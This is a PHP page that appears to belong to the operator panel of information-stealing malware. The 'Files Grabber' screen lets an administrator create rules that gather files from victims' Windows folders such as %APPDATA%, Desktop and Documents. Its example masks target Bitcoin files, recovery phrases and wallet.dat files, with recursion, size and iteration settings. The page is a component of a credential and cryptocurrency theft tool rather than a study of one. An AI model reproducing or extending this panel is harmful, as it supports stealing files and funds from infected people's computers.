<?php

include "../config.php";
include_once "app/functions.php";
include_once "app/managers/AccountManager.php";

session_start();

$link = ConnectDB();

$accountManager = new AccountManager($link);
$accountManager->CheckAuth();

$is_admin = ($_SESSION['user_group'] === 'Administrator') ? 1 : 0;

if(!$is_admin)
{
    header("Location: dashboard");
    exit();
}

$page_name = "Files Grabber";

$is_admin = ($_SESSION['user_group'] === 'Administrator') ? 1 : 0;

include_once 'app/pages/header.php';

?>
<div class="body-wrapper">
    <div class="container-fluid">
        
        <div class="card card-body py-3">
            <div class="row align-items-center">
                <div class="col-12">
                    <div class="d-sm-flex align-items-center justify-space-between">
                        <h4 class="mb-4 mb-sm-0 card-title">Files Grabber</h4>
                        <nav aria-label="breadcrumb" class="ms-auto">
                            <a href="javascript:void(0)" id="btn-add-contact" class="btn btn-xs btn-primary align-items-center" onclick="createRuleModal();">Create Rule</a>
                        </nav>
                    </div>
                </div>
            </div>
        </div>
        
        <style>
            #grabber_table td {
  white-space: normal;
  word-wrap: break-word;
}

        </style>

        <table id="grabber_table" class="table text-nowrap customize-table mb-0 align-middle" >
            <thead class="text-dark fs-4">
                <tr>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">ID</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Name</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Start Path</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Masks</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Recursive</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Max Size</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Iterations</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Status</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Actions</h6>
                    </th>
                </tr>
            </thead>
            <tbody>

            </tbody>
        </table>
    </div>
</div>
</div>

<!-- Modal Create Rule -->
<div class="modal fade" id="create_rule_modal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-2">
    <div class="modal-dialog modal-dialog-scrollable modal-lg">
        <div class="modal-content">
            <div class="modal-header d-flex align-items-center">
                <h4 class="modal-title" id="modal_create_rule_header">Create File Grabber Rule</h4>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            
            <div class="modal-body">
                <div class="card">
                    <div>
                    
                        <div class="form-body">
                            <div class="row">
                                <div class="col-md-12">
                                    <div class="mb-3">
                                        <input type="text" class="form-control" placeholder="Rule Name" id="create_rule_name">
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-3">
                                    <div class="mb-3">
                                        <div class="form-group mb-4">
                                            <select class="form-select" id="create_rule_csidl" >
                                                <option value="0">%LOCALAPPDATA%\</option>
                                                <option value="1">%APPDATA%\</option>
                                                <option value="2" selected>%DESKTOP%\</option>
                                                <option value="3">%USERPROFILE%\</option>
                                                <option value="4">%DOCUMENTS%\</option>
                                                <option value="5">%PROGRAMFILES%\</option>
                                                <option value="6">%PROGRAMFILES_86%\</option>
                                            </select>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-9">
                                    <div class="mb-3">
                                        <input type="text" class="form-control" placeholder="Start Path" id="create_rule_start_path">
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-12">
                                    <div class="mb-3">
                                        <div class="form-group">
                                            <textarea class="form-control" rows="10" placeholder="*.txt&#10;*btc*.*&#10;*recovery*.*&#10;*wallet*.dat" id="create_rule_masks"></textarea>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-4">
                                    <div class="mb-3">
                                        <div class="form-group mb-4">
                                            <select class="form-select" id="create_rule_recursive">
                                                <option value="1">Recursive</option>
                                                <option value="0">No</option>
                                            </select>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-4">
                                    <div class="mb-3">
                                        <input type="number" class="form-control" placeholder="Iterations" id="create_rule_iterations">
                                    </div>
                                </div>
                                <div class="col-md-4">
                                    <div class="mb-3">
                                        <input type="number" class="form-control" placeholder="Max Size (kB)" id="create_rule_max_size">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <a id="modal_create_button" href="#" class="btn btn-primary" >Create</a>
                    <button type="button" class="btn bg-danger-subtle text-danger  waves-effect text-start" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>        
</div>

<div class="dark-transparent sidebartoggler"></div>

<?php include_once 'app/pages/footer.php'; ?>

<!-- blocklist worker -->
<script src="assets/js/grabber.js"></script>
</body>
</html>